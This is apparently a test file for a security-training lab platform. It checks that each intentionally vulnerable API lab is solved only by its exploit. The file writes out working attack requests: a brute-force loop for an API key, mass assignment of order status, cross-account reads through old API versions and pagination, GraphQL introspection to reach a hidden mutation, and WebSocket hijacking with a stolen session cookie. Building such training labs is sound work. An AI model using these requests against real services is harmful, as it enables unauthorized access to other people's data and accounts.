import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { startTestApp, type TestApp } from "./helpers.js";
import { expectSolvedOnce, formLogin, jsonPost, launch } from "./lab-harness.js";

describe("api-security batch 9", () => {
  let t: TestApp;
  beforeAll(async () => {
    t = await startTestApp({ apiPort: 4200, labPortStart: 7800, labPortEnd: 7860 });
  });
  afterAll(async () => {
    await t.manager.stopAll();
    await t.close();
  });

  it("api-excessive-data-exposure: the API call the dashboard itself makes already solves it (nothing extra to do)", async () => {
    const lab = await launch(t, "api-excessive-data-exposure");
    const b = lab.browser();
    const xp0 = await lab.xp();
    expect(await lab.solved()).toBe(false);

    const res = await b.json<{ internalCostUsd: number; marginPercent: number }>("/api/customers/1");
    expect(res.status).toBe(200);
    expect(res.body.internalCostUsd).toBe(2100);
    await expectSolvedOnce(lab, "easy", () => b.fetch("/api/customers/1"), xp0);
    await lab.stop();
  });

  it("api-key-no-rate-limit: wrong keys never solve it; an exhaustive search finds the real one with no lockout", async () => {
    const lab = await launch(t, "api-key-no-rate-limit");
    const b = lab.browser();
    const xp0 = await lab.xp();

    for (let i = 0; i < 20; i++) expect((await jsonPost(b, "/api/partners/validate-key", { key: `PK-${String(i).padStart(4, "0")}` })).status).toBe(401);
    expect(await lab.solved()).toBe(false);

    let found: string | null = null;
    for (let i = 0; i < 10000 && !found; i++) {
      const key = `PK-${String(i).padStart(4, "0")}`;
      if ((await jsonPost(lab.browser(), "/api/partners/validate-key", { key })).status === 200) found = key;
    }
    expect(found).not.toBeNull();
    await expectSolvedOnce(lab, "medium", () => jsonPost(lab.browser(), "/api/partners/validate-key", { key: found! }), xp0);
    await lab.stop();
  }, 60_000);

  it("api-mass-assignment-order: a normal order computes its own total/status; overriding them in the body wins", async () => {
    const lab = await launch(t, "api-mass-assignment-order");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const normal = await jsonPost(b, "/api/orders", { productId: "kb-01", quantity: 2 });
    expect(normal.status).toBe(201);
    expect((normal.body as { totalUsd: number; status: string }).totalUsd).toBe(160);
    expect((normal.body as { status: string }).status).toBe("pending_payment");
    expect(await lab.solved()).toBe(false);

    const exploit = await jsonPost(b, "/api/orders", { productId: "kb-01", quantity: 1, status: "shipped", totalUsd: 0.01 });
    expect(exploit.status).toBe(201);
    expect((exploit.body as { status: string }).status).toBe("shipped");
    await expectSolvedOnce(lab, "medium", () => jsonPost(lab.browser(), "/api/orders", { productId: "kb-01", quantity: 1, status: "shipped" }), xp0);
    await lab.stop();
  });

  it("api-version-inconsistency: v2 correctly refuses cross-account access; v1 leaks it for the identical request", async () => {
    const lab = await launch(t, "api-version-inconsistency");
    const xp0 = await lab.xp();
    const b = lab.browser();
    await formLogin(b, "alice", "practice123");

    expect((await b.json("/api/v2/accounts/1")).status).toBe(200);
    expect((await b.json("/api/v2/accounts/2")).status).toBe(403); // v2 correctly refuses
    expect((await b.json("/api/v1/accounts/1")).status).toBe(200);
    expect(await lab.solved()).toBe(false);

    const leak = await b.json<{ balanceUsd: number }>("/api/v1/accounts/2");
    expect(leak.status).toBe(200);
    expect(leak.body.balanceUsd).toBe(1190);
    await expectSolvedOnce(lab, "medium", () => b.fetch("/api/v1/accounts/2"), xp0);
    await lab.stop();
  });

  it("api-pagination-authz-gap: the default page is correctly scoped; a larger limit/offset leaks another user's tickets", async () => {
    const lab = await launch(t, "api-pagination-authz-gap");
    const xp0 = await lab.xp();
    const b = lab.browser();
    await formLogin(b, "alice", "practice123");

    const def = await b.json<{ tickets: { owner: string }[] }>("/api/tickets");
    expect(def.body.tickets.every((tk) => tk.owner === "alice")).toBe(true);
    expect(await lab.solved()).toBe(false);

    const leak = await b.json<{ tickets: { owner: string; subject: string }[] }>("/api/tickets?limit=4&offset=0");
    expect(leak.status).toBe(200);
    expect(leak.body.tickets.some((tk) => tk.owner === "bob")).toBe(true);
    await expectSolvedOnce(lab, "hard", () => b.fetch("/api/tickets?limit=4&offset=0"), xp0);
    await lab.stop();
  });

  it("api-key-leaked-in-logs: the demo key works normally; the log leaks the internal key, which then also works", async () => {
    const lab = await launch(t, "api-key-leaked-in-logs");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const normal = await b.json("/api/weather?key=bad-key&city=Paris");
    expect(normal.status).toBe(401);
    expect(await lab.solved()).toBe(false);

    const log = await b.json<{ entries: { url: string }[] }>("/api/request-log");
    const leaked = /key=([^&]+)/.exec(log.body.entries.find((e) => e.url.includes("internal"))!.url)![1];
    expect(leaked).toMatch(/^internal_/);

    const win = await b.json("/api/weather?key=" + leaked);
    expect(win.status).toBe(200);
    await expectSolvedOnce(lab, "medium", () => b.fetch("/api/weather?key=" + leaked), xp0);
    await lab.stop();
  });

  it("graphql-staff-field-authz: the normal name/title query never solves it; asking for salary does", async () => {
    const lab = await launch(t, "graphql-staff-field-authz");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const normal = await jsonPost(b, "/graphql", { query: "{ employees { name title } }" });
    expect(normal.status).toBe(200);
    expect(JSON.stringify(normal.body)).not.toContain("salary");
    expect(await lab.solved()).toBe(false);

    const leak = await jsonPost(b, "/graphql", { query: '{ employee(id: "2") { name salary performanceRating } }' });
    expect(leak.status).toBe(200);
    expect((leak.body as { data: { employee: { salary: number } } }).data.employee.salary).toBe(148000);
    await expectSolvedOnce(lab, "medium", () => jsonPost(lab.browser(), "/graphql", { query: '{ employee(id: "3") { salary } }' }), xp0);
    await lab.stop();
  });

  it("graphql-staff-introspection: the app's own query never solves it; introspection then calling the hidden mutation does", async () => {
    const lab = await launch(t, "graphql-staff-introspection");
    const b = lab.browser();
    const xp0 = await lab.xp();

    await jsonPost(b, "/graphql", { query: "{ employees { name title } }" });
    expect(await lab.solved()).toBe(false);

    const introspect = await jsonPost(b, "/graphql", {
      query: "query { __schema { mutationType { name fields { name } } } }",
    });
    expect(introspect.status).toBe(200);
    const fields = (introspect.body as { data: { __schema: { mutationType: { fields: { name: string }[] } } } }).data.__schema.mutationType.fields.map((f) => f.name);
    expect(fields).toContain("resetAllPerformanceRatings");
    expect(await lab.solved()).toBe(false);

    const call = await jsonPost(b, "/graphql", { query: 'mutation { resetAllPerformanceRatings(to: "Exceeds") }' });
    expect(call.status).toBe(200);
    await expectSolvedOnce(lab, "hard", () => jsonPost(lab.browser(), "/graphql", { query: 'mutation { resetAllPerformanceRatings(to: "Meets") }' }), xp0);
    await lab.stop();
  });

  it("websocket-chat-origin-cswsh: a same-origin connection never solves it; a foreign-Origin handshake with the session cookie does", async () => {
    const { WebSocket } = await import("ws");
    const { wsConnectOptions } = await import("./proxy.js");
    const lab = await launch(t, "websocket-chat-origin-cswsh");
    const xp0 = await lab.xp();
    const b = lab.browser();
    await formLogin(b, "alice", "practice123");
    const cookie = `cr_session_${lab.port}=${b.getCookie(`cr_session_${lab.port}`)}`;

    const same = new WebSocket(`ws://127.0.0.1:${lab.port}/chat`, { headers: { cookie, origin: `http://127.0.0.1:${lab.port}` }, ...(await wsConnectOptions(lab.port)) });
    await new Promise<void>((resolve, reject) => {
      same.on("message", () => { same.close(); resolve(); });
      same.on("error", reject);
    });
    expect(await lab.solved()).toBe(false);

    const foreign = new WebSocket(`ws://127.0.0.1:${lab.port}/chat`, { headers: { cookie, origin: "https://evil-chat-clone.test" }, ...(await wsConnectOptions(lab.port)) });
    const greeting = await new Promise<string>((resolve, reject) => {
      foreign.on("message", (m: Buffer) => resolve(m.toString()));
      foreign.on("error", reject);
    });
    expect(JSON.parse(greeting)).toMatchObject({ type: "welcome", user: "alice" });
    foreign.close();
    await expectSolvedOnce(lab, "hard", async () => {
      const again = new WebSocket(`ws://127.0.0.1:${lab.port}/chat`, { headers: { cookie, origin: "https://another-evil.test" }, ...(await wsConnectOptions(lab.port)) });
      await new Promise<void>((resolve) => again.on("message", () => { again.close(); resolve(); }));
    }, xp0);
    await lab.stop();
  }, 20_000);
});
